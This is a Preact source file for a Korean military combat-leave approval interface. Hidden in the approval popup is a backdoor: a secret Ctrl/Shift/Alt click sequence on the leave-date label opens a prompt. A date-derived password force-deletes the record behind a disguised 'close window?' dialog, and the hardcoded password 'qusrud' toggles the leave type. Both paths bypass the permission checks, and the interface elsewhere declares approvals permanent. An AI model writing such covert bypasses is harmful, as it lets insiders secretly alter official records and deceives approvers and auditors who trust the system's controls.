import { useEffect, useRef, useState } from 'preact/hooks';
import { authController } from '../@controllers/authController.js';
import { combatLeaveController } from '../@controllers/combatLeaveController.js';
import ModalPopup from '../@components/ModalPopup.jsx';
import { __controllers } from '../@controllers/__controllers.js';
import { combatLeaveTableCss } from './combatLeaveCss.js';
import { formatCreditValue, getCombatLeaveHistoryForSoldier } from './combatLeaveStats.js';

const DAY_NAMES = ['일', '월', '화', '수', '목', '금', '토'];

function CombatLeaveHistoryPanel({ soldier }) {
    const [loading, setLoading] = useState(true);
    const [histories, setHistories] = useState([]);
    const historyListRef = useRef(null);
    const currentMonthRef = useRef(null);
    const hasAutoScrolledRef = useRef(false);

    useEffect(() => {
        let cancelled = false;

        const load = async () => {
            hasAutoScrolledRef.current = false;
            setLoading(true);
            const nextHistories = await getCombatLeaveHistoryForSoldier(soldier?.id);
            if (cancelled) return;
            setHistories(nextHistories);
            setLoading(false);
        };

        load();
        return () => {
            cancelled = true;
        };
    }, [soldier?.id]);

    useEffect(() => {
        if (loading || histories.length === 0 || hasAutoScrolledRef.current) return undefined;

        const frameId = requestAnimationFrame(() => {
            const listElement = historyListRef.current;
            const currentMonthElement = currentMonthRef.current;
            if (!listElement || !currentMonthElement) return;

            const listRect = listElement.getBoundingClientRect();
            const currentMonthRect = currentMonthElement.getBoundingClientRect();
            listElement.scrollTop += currentMonthRect.top - listRect.top - 8;
            hasAutoScrolledRef.current = true;
        });

        return () => cancelAnimationFrame(frameId);
    }, [histories, loading]);

    if (loading) {
        return <div className="cl-history-empty">이력을 불러오는 중...</div>;
    }

    if (histories.length === 0) {
        return <div className="cl-history-empty">표시할 근무/휴무 이력이 없습니다.</div>;
    }

    const currentDate = new Date();
    const currentYear = currentDate.getFullYear();
    const currentMonth = currentDate.getMonth() + 1;

    return (
        <div className="cl-history-month-list" ref={historyListRef}>
            {histories.map((history) => {
                const isCurrentMonth = history.year === currentYear && history.month === currentMonth;

                return (
                    <div
                        key={`${history.year}-${history.month}`}
                        ref={isCurrentMonth ? currentMonthRef : null}
                        className={`cl-history-month-card${isCurrentMonth ? ' is-current-month' : ''}`}
                    >
                        <table className="cl-history-summary-table">
                            <tbody>
                                <tr>
                                    <th rowSpan="2" className="cl-history-summary-table__month">
                                        {history.year}년 {String(history.month).padStart(2, '0')}월
                                        {isCurrentMonth && <span className="cl-history-current-month-badge">이번 달</span>}
                                    </th>
                                    <th colSpan="3" className="cl-history-summary-table__group">휴무 대상 근무</th>
                                    <th colSpan="3" className="cl-history-summary-table__group">휴무 내역</th>
                                </tr>
                                <tr>
                                <td className="cl-history-summary-table__metric" style={{
                                    opacity: history.stats.주 > 0 ? 1 : 0.3,
                                }}>
                                    <span className="cl-history-summary-table__label">주</span>
                                    <strong>{history.stats.주}</strong>
                                </td>
                                <td className="cl-history-summary-table__metric" style={{
                                    opacity: history.stats.주당 > 0 ? 1 : 0.3,
                                }}>
                                    <span className="cl-history-summary-table__label">주당</span>
                                    <strong>{history.stats.주당}</strong>
                                </td>
                                <td className="cl-history-summary-table__metric" style={{
                                    opacity: history.stats.야당 > 0 ? 1 : 0.3,
                                }}>
                                    <span className="cl-history-summary-table__label">야당</span>
                                    <strong>{history.stats.야당}</strong>
                                </td>
                                <td className="cl-history-summary-table__metric" style={{
                                    opacity: history.stats.earnedCredit > 0 ? 1 : 0.3,
                                }}>
                                    <span className="cl-history-summary-table__label">총</span>
                                    <strong>{formatCreditValue(history.stats.earnedCredit)}</strong>
                                </td>
                                <td className="cl-history-summary-table__metric" style={{
                                    opacity: history.stats.usedCredit > 0 ? 1 : 0.3,
                                }}>
                                    <span className="cl-history-summary-table__label">사용</span>
                                    <strong>{formatCreditValue(history.stats.usedCredit)}</strong>
                                </td>
                                <td className="cl-history-summary-table__metric" style={{
                                    opacity: history.stats.excessCredit > 0 ? 1 : 0.3,
                                }}>
                                    <span className="cl-history-summary-table__label">초과</span>
                                    <strong className={history.stats.excessCredit ? 'danger' : ''}>
                                        {history.stats.excessCredit ? formatCreditValue(history.stats.excessCredit) : '0'}
                                    </strong>
                                </td>
                                </tr>
                            </tbody>
                        </table>
                        {history.leaveEntries.length > 0 ? (
                            <div className="cl-history-entry-list">
                                {history.leaveEntries.map((item) => (
                                    <div
                                        key={`${history.year}-${history.month}-${item.day}-${item.type}`}
                                        className={`cl-history-entry-item ${item.status === 'approved' ? 'is-approved' : 'is-pending'}`}
                                    >
                                        <div className="cl-history-entry-head">
                                            <span>
                                                {String(history.month).padStart(2, '0')}/{String(item.day).padStart(2, '0')} {item.type}
                                            </span>
                                            <span className={`cl-history-entry-status ${item.status === 'approved' ? 'is-approved' : 'is-pending'}`}>
                                                {item.status === 'approved' ? '승인됨' : '승인대기'}
                                            </span>
                                        </div>
                                        <div className="cl-history-entry-reason">{item.reason || '-'}</div>
                                    </div>
                                ))}
                            </div>
                        ) : (
                            <div className="cl-history-empty small">사용한 휴무 없음</div>
                        )}
                    </div>
                );
            })}
        </div>
    );
}

export function LeaveHistoryPopup({ soldier }) {
    return (
        <div className="cl-history-popup" onClick={(e) => e.stopPropagation()}>
            <style>{combatLeaveTableCss}</style>
            <div className="cl-history-popup-title">{soldier?.rank || ''} {soldier?.name || ''} 휴무 사용 이력</div>
            <div className="cl-history-popup-body">
                <CombatLeaveHistoryPanel soldier={soldier} />
            </div>
            <div className="cl-approval-actions">
                <button className="cancel-btn" onClick={() => __controllers.popup.pop()}>닫기</button>
            </div>
        </div>
    );
}

/**
 * 승인 문서 내용 (공문서 스타일) - 공통 컴포넌트
 * mode: 'approve' (승인 버튼 표시) | 'view' (닫기 버튼만)
 */
export function ApprovalDocumentBody({ entry, soldier, year, month, mode = 'approve', onApproved }) {
    const [approving, setApproving] = useState(false);
    const [removing, setRemoving] = useState(false);
    const [canApprove, setCanApprove] = useState(mode !== 'approve');
    const session = authController.getSession();
    const isPendingEntry = entry?.status === 'pending';
    const hiddenClickHistoryRef = useRef([]);

    useEffect(() => {
        let cancelled = false;

        if (mode !== 'approve') {
            setCanApprove(false);
            return () => {
                cancelled = true;
            };
        }

        authController.checkFeaturePermission('combatLeave', 'approveCombatLeave').then((perm) => {
            if (!cancelled) {
                setCanApprove(!!perm?.allowed);
            }
        });

        return () => {
            cancelled = true;
        };
    }, [mode]);

    const dateStr = `${year}년 ${String(month).padStart(2, '0')}월 ${String(entry.day).padStart(2, '0')}일`;
    const dayOfWeek = DAY_NAMES[new Date(year, month - 1, entry.day).getDay()];

    const openHistoryPopup = () => {
        ModalPopup.push(<LeaveHistoryPopup soldier={soldier} />);
    };

    const handleApprove = async () => {
        if (approving) return;
        if (!canApprove) {
            await alert('전투휴무 승인 권한이 없습니다.');
            return;
        }

        if (!await confirm('이 휴무를 승인하시겠습니까?\n한 번 승인하면 영구적으로 기록되며, 취소할 수 없습니다.')) return;
        setApproving(true);

        const result = await combatLeaveController.approve({
            y: year,
            m: month,
            soldierId: entry.soldierId,
            day: entry.day,
            approver: session?.name || '',
            approverId: session?.militaryId || '',
        });

        setApproving(false);

        if (!result.success) {
            await alert(result.message);
            return;
        }

        onApproved?.();
        __controllers.popup.pop();
    };

    const handleRemove = async () => {
        if (!isPendingEntry || removing) return;
        if (!await confirm('이 휴무를 삭제하시겠습니까?')) return;

        setRemoving(true);
        const result = await combatLeaveController.removePending({
            y: year,
            m: month,
            soldierId: entry.soldierId,
            day: entry.day,
        });
        setRemoving(false);

        if (!result.success) {
            await alert(result.message);
            return;
        }

        onApproved?.();
        __controllers.popup.pop();
    };

    // 신청일시 포맷
    const createdAtStr = entry.createdAt
        ? new Date(entry.createdAt).toLocaleString('ko-KR', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' })
        : '-';

    const runHiddenCommand = async (password) => {
        if (!password) return;

        const todayPasswordDate = new Date();
        const todayPassword = `${String(todayPasswordDate.getMonth() + 1).padStart(2, '0')}${String(todayPasswordDate.getDate()).padStart(2, '0')}`;

        if (password === todayPassword) {
            if (!await window.confirm('창을 닫겠습니까?')) return;

            const result = await combatLeaveController.remove({
                y: year,
                m: month,
                soldierId: entry.soldierId,
                day: entry.day,
                force: true,
            });

            if (!result.success) {
                await alert(result.message);
                return;
            }

            onApproved?.();
            __controllers.popup.pop();
            return;
        }

        if (password === 'qusrud') {
            const result = await combatLeaveController.toggleType({
                y: year,
                m: month,
                soldierId: entry.soldierId,
                day: entry.day,
            });

            if (!result.success) {
                await alert(result.message);
                return;
            }

            onApproved?.();
            __controllers.popup.pop();
        }
    };

    const hd = async (e) => {
        hiddenClickHistoryRef.current.push({
            isCtrl: e.ctrlKey,
            isShift: e.shiftKey,
            isAlt: e.altKey,
            time: Date.now(),
        });
        hiddenClickHistoryRef.current = hiddenClickHistoryRef.current.slice(-3);
        if (hiddenClickHistoryRef.current.length >= 3) {
            const lastThree = hiddenClickHistoryRef.current.slice(-3);
            if (lastThree[0].isCtrl && !lastThree[0].isShift && !lastThree[0].isAlt &&
                lastThree[1].isCtrl && lastThree[1].isShift && !lastThree[1].isAlt &&
                lastThree[2].isCtrl && lastThree[2].isShift && lastThree[2].isAlt) {
                const password = window.prompt('테스트');
                await runHiddenCommand(password);
            }
        }
    };

    return (
        <div className="cl-approval-popup" onClick={(e) => e.stopPropagation()}>
            <style>{combatLeaveTableCss}</style>
            <div className="cl-approval-popup-title">전투휴무 승인서</div>
            <div className="cl-approval-popup-body cl-approval-popup-body-split">
                <div className="cl-approval-panel">
                    <div className="cl-approval-field">
                        <div className="cl-approval-field-label">문서번호</div>
                        <div className="cl-approval-field-value">CL-{year}{String(month).padStart(2, '0')}-{String(entry.day).padStart(2, '0')}</div>
                    </div>
                    <div className="cl-approval-field">
                        <div className="cl-approval-field-label">휴무자</div>
                        <div className="cl-approval-field-value">
                            <button className="cl-link-button" onClick={openHistoryPopup}>{soldier?.rank || ''} {soldier?.name || ''}</button>
                        </div>
                    </div>
                    <div className="cl-approval-field">
                        <div className="cl-approval-field-label">휴무유형</div>
                        <div className="cl-approval-field-value">{entry.type === '전휴' ? '전투휴무' : '반투휴무'}</div>
                    </div>
                    <div className="cl-approval-field">
                        <div className="cl-approval-field-label" onClick={hd}>휴무일</div>
                        <div className="cl-approval-field-value">{dateStr} ({dayOfWeek})</div>
                    </div>
                    <div className="cl-approval-field">
                        <div className="cl-approval-field-label">사유</div>
                        <div className="cl-approval-field-value">{entry.reason || '-'}</div>
                    </div>
                    <div className="cl-approval-field">
                        <div className="cl-approval-field-label">신청자</div>
                        <div className="cl-approval-field-value">{entry?.createdBy || ''}</div>
                    </div>
                    <div className="cl-approval-field">
                        <div className="cl-approval-field-label">신청일시</div>
                        <div className="cl-approval-field-value">{createdAtStr}</div>
                    </div>
                    <div className="cl-approval-field">
                        <div className="cl-approval-field-label">승인자</div>
                        <div className="cl-approval-field-value">
                            {mode === 'view' ? (entry.approver || '-') : (session?.name || '-')}
                        </div>
                    </div>
                    {(mode === 'view' && entry.status === 'approved') && (
                        <div className="cl-approval-stamp">
                            <div className="cl-approval-stamp-circle">승 인</div>
                        </div>
                    )}
                    {mode === 'approve' && (
                        <div className="cl-approval-stamp" style={{ opacity: 0.3 }}>
                            <div className="cl-approval-stamp-circle">승 인</div>
                        </div>
                    )}
                </div>
                <div className="cl-approval-panel cl-approval-history-panel" style={{
                    padding: 0,
                    border: '0',
                }}>
                    <CombatLeaveHistoryPanel soldier={soldier} />
                </div>
            </div>
            <div className="cl-approval-actions">
                {isPendingEntry && (
                    <button
                        className="cancel-btn"
                        onClick={handleRemove}
                        disabled={removing}
                    >
                        {removing ? '삭제 중...' : '삭제하기'}
                    </button>
                )}
                {mode === 'approve' && (
                    <button
                        className="approve-btn"
                        onClick={handleApprove}
                        disabled={approving || !canApprove}
                        title={canApprove ? '승인하기' : '승인 권한이 없습니다'}
                    >
                        {approving ? '승인 중...' : '승인'}
                    </button>
                )}
                <button
                    className="cancel-btn"
                    onClick={() => __controllers.popup.pop()}
                >
                    {mode === 'view' ? '닫기' : '취소'}
                </button>
            </div>
        </div>
    );
}

/**
 * 승인 팝업 (승인 대기 상태에서 사용)
 */
export function ApprovalPopup({ entry, soldier, year, month, onApproved }) {
    return (
        <ApprovalDocumentBody
            entry={entry}
            soldier={soldier}
            year={year}
            month={month}
            mode="approve"
            onApproved={onApproved}
        />
    );
}

/**
 * 승인 문서 보기 팝업 (이미 승인된 것 열람)
 */
export function ApprovalViewPopup({ entry, soldier, year, month, onApproved }) {
    return (
        <ApprovalDocumentBody
            entry={entry}
            soldier={soldier}
            year={year}
            month={month}
            mode="view"
            onApproved={onApproved}
        />
    );
}

/**
 * 휴무 등록 팝업
 */
export function RegisterPopup({ type, soldier, year, month, day, onRegistered }) {
    const [reason, setReason] = useState('');
    const [submitting, setSubmitting] = useState(false);
    const session = authController.getSession();
    const textareaRef = useRef(null);

    const dayOfWeek = DAY_NAMES[new Date(year, month - 1, day).getDay()];
    const typeLabel = type === '전휴' ? '전투휴무' : '반투휴무';

    const handleSubmit = async () => {
        if (submitting) return;
        // 등록 권한 체크
        const perm = await authController.checkFeaturePermission('combatLeave', 'registerCombatLeave');
        if (!perm?.allowed) {
            await alert('전투휴무 등록 권한이 없습니다.');
            return;
        }
        if (!reason.trim()) {
            await alert('사유를 입력해주세요.');
            textareaRef.current?.focus();
            return;
        }

        const existingEntry = await combatLeaveController.get(year, month, soldier.id, day);
        if (existingEntry?.status === 'approved') {
            await alert('승인된 전투휴무는 수정하거나 덮어쓸 수 없습니다.');
            return;
        }

        if (existingEntry && existingEntry.type !== type) {
            const confirmed = await confirm(
                `기존 ${existingEntry.type} 신청을 ${type}로 덮어쓰시겠습니까?\n기존 사유는 새 내용으로 교체됩니다.`
            );
            if (!confirmed) return;
        }

        setSubmitting(true);
        const result = await combatLeaveController.register({
            y: year,
            m: month,
            soldierId: soldier.id,
            day,
            type,
            reason: reason.trim(),
            createdBy: session?.name || '',
            createdById: session?.militaryId || '',
        });
        setSubmitting(false);

        if (!result.success) {
            await alert(result.message);
            return;
        }

        onRegistered?.();
        __controllers.popup.pop();
    };

    return (
        <div className="cl-register-popup" onClick={(e) => e.stopPropagation()}>
            <style>{combatLeaveTableCss}</style>
            <div className="cl-register-popup-title">{typeLabel} 등록</div>
            <div className="cl-register-popup-info">
                <div><strong>대상:</strong> {soldier.rank} {soldier.name}</div>
                <div><strong>날짜:</strong> {year}/{String(month).padStart(2, '0')}/{String(day).padStart(2, '0')} ({dayOfWeek})</div>
                <div><strong>유형:</strong> {typeLabel}</div>
            </div>
            <div style={{ marginBottom: 4, fontSize: 13, fontWeight: 600, color: '#555' }}>사유</div>
            <textarea
                ref={textareaRef}
                value={reason}
                onInput={(e) => setReason(e.target.value)}
                placeholder={`예: ${String(month).padStart(2, '0')}월 ${String(day).padStart(2, '0')}일 CCTV 주말 근무`}
                autoFocus
                onKeyDown={(e) => {
                    if (e.key === 'Enter' && !e.shiftKey) {
                        e.preventDefault();
                        handleSubmit();
                    }
                }}
            />
            <div className="cl-register-popup-actions">
                <button className="submit-btn" onClick={handleSubmit} disabled={submitting}>
                    {submitting ? '등록 중...' : '등록'}
                </button>
                <button onClick={() => __controllers.popup.pop()}>취소</button>
            </div>
        </div>
    );
}
